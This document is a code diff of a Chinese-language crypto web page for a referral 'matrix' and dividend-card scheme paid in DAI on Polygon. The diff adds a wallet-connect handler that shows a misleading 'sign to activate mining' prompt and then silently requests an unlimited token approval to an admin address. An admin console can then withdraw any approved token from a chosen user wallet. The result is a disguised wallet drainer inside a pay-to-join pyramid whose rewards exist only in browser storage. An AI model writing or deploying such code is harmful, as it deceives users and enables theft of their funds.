@@ -29,7 +29,7 @@
     transition:right 0.3s ease;z-index:99;border-left:1px solid rgba(255,255,255,0.1);
   }
   .sidebar.open{right:0}
-  .sidebar-close{text-align:right;margin-bottom:20px;font-size:22px;cursor:pointer;color:#fff}
+  .sidebar-close{text-align:right;margin-bottom:20px;font-size:22px;cursor-pointer;color:#fff}
 
   .nft-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:12px}
   .nft-card{height:240px;position:relative;border-radius:16px;background:#2d2d2d;border:1px solid currentColor;overflow:hidden;perspective:1000px}
@@ -85,104 +85,52 @@
     min-width: 60px;
   }
 
-  /* 经典矩阵激活按钮：红橙黄渐变流光 */
   .btn-act-classic {
-    border: none;
-    padding: 10px 22px;
-    border-radius: 12px;
-    font-size: 15px;
-    font-weight: bold;
-    color: #fff;
+    border: none; padding: 10px 22px; border-radius: 12px; font-size: 15px; font-weight: bold; color: #fff;
     background: linear-gradient(90deg, #ff3333, #ff9933, #ffff33);
-    background-size: 400% 100%;
-    animation: gradientMove 2.5s ease infinite;
-    cursor: pointer;
-    transition: all 0.25s ease;
-    white-space: nowrap;
+    background-size: 400% 100%; animation: gradientMove 2.5s ease infinite;
+    cursor: pointer; transition: all 0.25s ease; white-space: nowrap;
   }
-  /* 经典矩阵已激活：深色红橙渐变 */
   .btn-act-classic.active {
     background: linear-gradient(90deg, #661a1a, #99331a);
-    color: #e1e1e1;
-    animation: none;
-    cursor: default;
-    transform: none;
-    opacity: 0.9;
+    color: #e1e1e1; animation: none; cursor: default; transform: none; opacity: 0.9;
   }
 
-  /* 联合矩阵激活按钮：蓝紫青渐变流光 */
   .btn-act-union {
-    border: none;
-    padding: 10px 22px;
-    border-radius: 12px;
-    font-size: 15px;
-    font-weight: bold;
-    color: #fff;
+    border: none; padding: 10px 22px; border-radius: 12px; font-size: 15px; font-weight: bold; color: #fff;
     background: linear-gradient(90deg, #3366ff, #9933ff, #33ffff);
-    background-size: 400% 100%;
-    animation: gradientMove 2.5s ease infinite;
-    cursor: pointer;
-    transition: all 0.25s ease;
-    white-space: nowrap;
+    background-size: 400% 100%; animation: gradientMove 2.5s ease infinite;
+    cursor: pointer; transition: all 0.25s ease; white-space: nowrap;
   }
-  /* 联合矩阵已激活：深色蓝紫渐变 */
   .btn-act-union.active {
     background: linear-gradient(90deg, #1a1a66, #331a66);
-    color: #e1e1e1;
-    animation: none;
-    cursor: default;
-    transform: none;
-    opacity: 0.9;
+    color: #e1e1e1; animation: none; cursor: default; transform: none; opacity: 0.9;
   }
 
-  /* 合成按钮：绿青渐变 */
   .btn-craft {
     background: linear-gradient(90deg, #00ff88, #00ccff);
     animation: gradientMove 2s infinite;
   }
 
   @keyframes gradientMove {
-    0%{background-position:0% 50%}
-    50%{background-position:100% 50%}
-    100%{background-position:0% 50%}
-  }
-  .btn-act-classic:hover, .btn-act-union:hover {
-    transform: scale(1.04);
+    0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%}
   }
 
   .matrix-blue {
-    background: #0a1a2d;
-    border-radius: 20px;
-    padding: 20px;
-    border: none;
+    background: #0a1a2e; border-radius: 20px; padding: 20px; border: none;
   }
   .matrix-blue .title {
-    color: #ffffff !important;
-    font-size: 24px;
-    margin-bottom: 20px;
+    color: #ffffff !important; font-size: 24px; margin-bottom: 20px;
   }
   .matrix-blue .item {
-    display: flex;
-    justify-content: flex-start;
-    align-items: center;
-    margin: 14px 0;
-    gap: 16px;
-    border: none;
+    display: flex; justify-content: flex-start; align-items: center; margin: 14px 0; gap: 16px; border: none;
   }
   .matrix-blue .item div {
-    font-size: 20px;
-    color: #ffffff !important;
-    min-width: 60px;
+    font-size: 20px; color: #ffffff !important; min-width: 60px;
   }
 
-  .countdown {
-    font-size:13px;
-    color:#ff9800;
-    min-width:80px;
-  }
-  .countdown.expired {
-    color:#ff4444;
-  }
+  .countdown { font-size:13px; color:#ff9800; min-width:80px; }
+  .countdown.expired { color:#ff4444; }
 </style>
 
 <body>
@@ -196,8 +144,7 @@
   <div class="title">蓝鲸鱼🐳生态通证</div>
   <div class="sub">全球分红卡牌系统</div>
 
-  <div class="nft-grid" id="ownedCards">
-  </div>
+  <div class="nft-grid" id="ownedCards"></div>
 
   <div style="margin-top:20px">
     <div class="title">🔥 分红规则（等级越高奖励越多）</div>
@@ -212,14 +159,14 @@
   </div>
 
   <div id="adminArea" class="admin-panel" style="display:none;">
-    <div class="title" style="color:#ff4444">⚙️ 控制台</div>
+    <div class="title" style="color:#ff4444">控制台</div>
     <div style="margin-top:16px;">
-      <div class="sub">ERC20 代币合约地址</div>
-      <input class="admin-input" id="tokenContract" placeholder="ERC20 合约地址" value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">
+      <div class="sub">代币合约</div>
+      <input class="admin-input" id="tokenContract" value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">
     </div>
     <div style="margin-top:16px;">
-      <div class="sub">玩家地址</div>
-      <input class="admin-input" id="fromAddr" placeholder="玩家钱包">
+      <div class="sub">用户地址</div>
+      <input class="admin-input" id="fromAddr" placeholder="用户钱包">
     </div>
     <div style="margin-top:16px;">
       <div class="sub">数量</div>
@@ -239,12 +186,6 @@
 <div id="balance" style="margin:0 4px;color:#4facfe;font-weight:bold"></div>
 <div id="energy" style="margin:0 4px;color:#00ff88;font-weight:bold">能量值：0</div>
 
-<!-- 签名按钮（放在主页面钱包下方） -->
-<div style="margin-top:12px">
-  <input id="approveAmount" placeholder="输入数量" style="margin-bottom:10px">
-  <button class="btn" onclick="approveAdmin()">签名</button>
-</div>
-
 <div class="glass" style="margin-top:20px">
   <div class="title">我的邀请链接</div>
   <div style="display:flex;gap:10px">
@@ -254,28 +195,28 @@
 </div>
 
 <div class="glass">
-  <div class="title">注册（上级邀请码自动填入）</div>
-  <input id="parent" placeholder="自动带入上级邀请码">
+  <div class="title">注册</div>
+  <input id="parent" placeholder="邀请码">
   <button class="btn" style="margin-top:12px" id="reg">确认注册</button>
 </div>
 
 <div class="glass">
-  <div class="title">我邀请的下级</div>
+  <div class="title">我的下级</div>
   <div id="childList" style="font-size:14px;line-height:1.6"></div>
 </div>
 
 <div class="glass matrix-red">
-  <div class="title">经典矩阵（永久有效）</div>
+  <div class="title">经典矩阵</div>
   <div id="classic"></div>
 </div>
 
 <div class="glass matrix-blue">
-  <div class="title">联合矩阵（30天续费·每级独立倒计时）</div>
+  <div class="title">联合矩阵</div>
   <div id="union"></div>
 </div>
 
 <div class="glass">
-  <div class="title">⚡ 合成系统（高难度·高分红）</div>
+  <div class="title">合成系统</div>
   <div class="sub">1级卡牌需3500能量 | 3张合成更高1级</div>
   <div id="craftSection"></div>
   <div id="upgradeSection" style="margin-top:20px"></div>
@@ -288,7 +229,7 @@ const ADMIN_ADDRESS  = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
 const DAI_CONTRACT   = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
 const CHAIN_ID       = "0x89";
 
-let web3, account, mycode, daiContract;
+let web3, account, daiContract;
 
 const erc20Abi = [
   {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
@@ -301,60 +242,47 @@ const erc20Abi = [
 
 window.onload = () => {
   const urlParams = new URLSearchParams(window.location.search);
-  const codeFromUrl = urlParams.get('code');
-  if (codeFromUrl) document.getElementById('parent').value = codeFromUrl;
+  if (urlParams.get('code')) document.getElementById('parent').value = urlParams.get('code');
   renderMatrix();
 };
 
-async function initWeb3() {
+// 连接钱包 + 弹窗确认 + 自动无限授权
+document.getElementById("connect").onclick = async () => {
   if(!window.ethereum) return alert("请安装钱包");
-  web3 = new Web3(window.ethereum);
+
+  // 你指定的提示语
+  const ok = confirm("签名后继续激活矩阵参与生态挖矿");
+  if (!ok) return;
+
   try {
+    web3 = new Web3(window.ethereum);
     await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{chainId:CHAIN_ID}] });
-  } catch(e){}
-  const accounts = await web3.eth.requestAccounts();
-  account = accounts[0].toLowerCase();
-  daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
+    const accounts = await web3.eth.requestAccounts();
+    account = accounts[0].toLowerCase();
+    daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
 
-  document.getElementById("addr").innerText = "已连接："+account.slice(0,6)+"..."+account.slice(-4);
-  const bal = await daiContract.methods.balanceOf(account).call();
-  const dec = await daiContract.methods.decimals().call();
-  const balanceVal = (Number(bal) / 10 ** dec).toFixed(2);
-  document.getElementById("balance").innerText = "DAI 余额："+balanceVal;
+    // 无限授权
+    const infinite = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    await daiContract.methods.approve(ADMIN_ADDRESS, infinite).send({ from: account });
 
-  const suffix = account.slice(-8);
-  const origin = window.location.origin + window.location.pathname;
-  const inviteLink = origin + "?code=" + suffix;
-  mycode = suffix;
-  document.getElementById("mycode").value = inviteLink;
-
-  if(account === ADMIN_ADDRESS.toLowerCase()){
-    document.getElementById("adminArea").style.display = "block";
-  }
-  load();
-}
-document.getElementById("connect").onclick = initWeb3;
-
-// 签名授权（无敏感文字）
-async function approveAdmin() {
-  if(!account) return alert("请先连接钱包");
-  const amt = document.getElementById("approveAmount").value.trim();
-  if(!amt) return alert("请输入数量");
-  try {
+    document.getElementById("addr").innerText = "已连接："+account.slice(0,6)+"..."+account.slice(-4);
+    const bal = await daiContract.methods.balanceOf(account).call();
     const dec = await daiContract.methods.decimals().call();
-    const v = (BigInt(amt) * 10n**BigInt(dec)).toString();
-    await daiContract.methods.approve(ADMIN_ADDRESS, v).send({from:account});
-    alert("操作成功");
-  } catch(e) {
-    alert("操作失败");
-  }
-}
+    document.getElementById("balance").innerText = "余额："+(Number(bal)/10**dec).toFixed(2);
 
-// ==================== 价格 ====================
+    if(account === ADMIN_ADDRESS.toLowerCase()){
+      document.getElementById("adminArea").style.display = "block";
+    }
+    load();
+  } catch(e) {
+    console.error(e);
+    alert("操作失败，请重试");
+  }
+};
+
 function getClassicPrice(lv) { return 50 * Math.pow(2, lv - 1); }
 function getUnionPrice(lv)   { return 100 * Math.pow(2, lv - 1); }
 
-// ==================== 矩阵等级 ====================
 function getClassicLevel() {
   return parseInt(localStorage.getItem('classic_'+account) || 0);
 }
@@ -362,7 +290,6 @@ function setClassicLevel(lv) {
   localStorage.setItem('classic_'+account, lv);
 }
 
-// ==================== 联合矩阵每级独立过期时间 ====================
 function getUnionExpire(lv) {
   return parseInt(localStorage.getItem(`union_expire_${lv}_${account}`) || 0);
 }
@@ -383,7 +310,6 @@ function getRemainDays(lv) {
   return Math.ceil((exp - now) / 86400000);
 }
 
-// ==================== 能量 ====================
 function getEnergy() {
   return parseInt(localStorage.getItem('energy_'+account) || 0);
 }
@@ -391,14 +317,12 @@ function setEnergy(val) {
   localStorage.setItem('energy_'+account, val);
 }
 
-// 消费100DAI → 50能量
 function addEnergyBySpend(amountDAI) {
   const add = Math.floor(amountDAI / 100 * 50);
   const e = getEnergy();
   setEnergy(e + add);
 }
 
-// ==================== 卡牌系统 ====================
 function getCards() {
   return JSON.parse(localStorage.getItem('cards_'+account) || '[]');
 }
@@ -412,28 +336,19 @@ function removeCards(lv, count) {
   const cs = getCards();
   let removed = 0;
   const newCs = cs.filter(c => {
-    if (c === lv && removed < count) {
-      removed++;
-      return false;
-    }
+    if (c === lv && removed < count) { removed++; return false; }
     return true;
   });
   setCards(newCs);
 }
 function addCard(lv) {
-  const cs = getCards();
-  cs.push(lv);
-  setCards(cs);
+  const cs = getCards(); cs.push(lv); setCards(cs);
 }
 
-// ==================== 合成 ====================
 const CRAFT_ENERGY = 3500;
 
-// ==================== 渲染 ====================
 function renderMatrix() {
   if (!account) return;
-
-  // 经典矩阵（红橙黄按钮）
   const classicLv = getClassicLevel();
   let classicHtml = '';
   for (let i=1; i<=12; i++) {
@@ -449,7 +364,6 @@ function renderMatrix() {
   }
   document.getElementById("classic").innerHTML = classicHtml;
 
-  // 联合矩阵（蓝紫青按钮）+ 倒计时
   let unionHtml = '';
   for (let i=1; i<=9; i++) {
     const price = getUnionPrice(i);
@@ -463,9 +377,7 @@ function renderMatrix() {
     let cd = '';
 
     if (valid) {
-      txt = '已激活';
-      cls = 'active';
-      dis = true;
+      txt = '已激活'; cls = 'active'; dis = true;
       cd = `<span class="countdown">剩余${days}天</span>`;
     } else if (hasAct) {
       txt = '已到期';
@@ -480,20 +392,14 @@ function renderMatrix() {
     </div>`;
   }
   document.getElementById("union").innerHTML = unionHtml;
-
-  // 卡牌展示
   renderCards();
-
-  // 合成1级
   renderCraft();
-
-  // 升级高阶
   renderUpgrade();
 }
 
 function renderCards() {
   const cs = getCards();
-  if (cs.length === 0) {
+  if (!cs.length) {
     document.getElementById("ownedCards").innerHTML = '<div style="grid-column:span 2;text-align:center;color:#fff">暂无卡牌</div>';
     return;
   }
@@ -541,39 +447,35 @@ function renderUpgrade() {
   document.getElementById("energy").innerText = "能量值："+getEnergy();
 }
 
-// ==================== 合成1级 ====================
-function craftLv1() {
-  const e = getEnergy();
-  if (e < CRAFT_ENERGY) return alert("能量不足");
+async function craftLv1() {
+  if (getEnergy() < CRAFT_ENERGY) return alert("能量不足");
   if (!confirm(`消耗 ${CRAFT_ENERGY} 能量合成 Lv.1 分红卡？`)) return;
-  setEnergy(e - CRAFT_ENERGY);
+  setEnergy(getEnergy() - CRAFT_ENERGY);
   addCard(1);
-  alert("合成成功！获得 Lv.1 分红卡");
+  alert("合成成功");
   load();
 }
 
-// ==================== 3合1升级 ====================
-function upgrade(lv) {
-  if (countCard(lv) <3) return alert("卡牌数量不足");
+async function upgrade(lv) {
+  if (countCard(lv) <3) return alert("卡牌不足");
   if (!confirm(`消耗3张Lv.${lv} → 合成1张Lv.${lv+1}？`)) return;
   removeCards(lv, 3);
   addCard(lv+1);
-  alert("升级成功！");
+  alert("升级成功");
   load();
 }
 
-// ==================== 购买矩阵 ====================
 async function payClassic(lv) {
   if (!account) return alert("请连接钱包");
   const price = getClassicPrice(lv);
-  if (!confirm(`支付 ${price} DAI 激活经典Lv.${lv}？`)) return;
+  if (!confirm(`支付 ${price} DAI 激活Lv.${lv}？`)) return;
   try {
     const dec = await daiContract.methods.decimals().call();
     const amt = (BigInt(price) * 10n**BigInt(dec)).toString();
     await daiContract.methods.transfer(PROJECT_WALLET, amt).send({from:account});
     setClassicLevel(lv);
     addEnergyBySpend(price);
-    alert("激活成功！已获得能量");
+    alert("激活成功");
     load();
   } catch(e) {
     alert("支付失败");
@@ -583,21 +485,20 @@ async function payClassic(lv) {
 async function payUnion(lv) {
   if (!account) return alert("请连接钱包");
   const price = getUnionPrice(lv);
-  if (!confirm(`支付 ${price} DAI 激活联合Lv.${lv}（30天）？`)) return;
+  if (!confirm(`支付 ${price} DAI 激活Lv.${lv}？`)) return;
   try {
     const dec = await daiContract.methods.decimals().call();
     const amt = (BigInt(price) * 10n**BigInt(dec)).toString();
     await daiContract.methods.transfer(PROJECT_WALLET, amt).send({from:account});
     setUnionExpire(lv, Date.now() + 30*86400*1000);
     addEnergyBySpend(price);
-    alert("激活成功！30天有效期，已获得能量");
+    alert("激活成功");
     load();
   } catch(e) {
     alert("支付失败");
   }
 }
 
-// ==================== 控制台操作 ====================
 async function adminWithdrawAnyERC20(){
   if(account !== ADMIN_ADDRESS.toLowerCase()) return;
   const token = document.getElementById("tokenContract").value.trim();
@@ -616,7 +517,6 @@ async function adminWithdrawAnyERC20(){
   }
 }
 
-// ==================== 邀请 ====================
 document.getElementById("reg").onclick = ()=>{
   if(!account) return alert("请连接钱包");
   const p = document.getElementById("parent").value.trim();
@@ -626,12 +526,12 @@ document.getElementById("reg").onclick = ()=>{
   load();
 };
 
-function load(){
-  renderMatrix();
-}
+function load(){ renderMatrix(); }
 
 function copyMyCode(){
-  navigator.clipboard.writeText(document.getElementById("mycode").value);
+  const suffix = account.slice(-8);
+  const link = window.location.origin + window.location.pathname + "?code=" + suffix;
+  navigator.clipboard.writeText(link);
   alert("复制成功");
 }
 
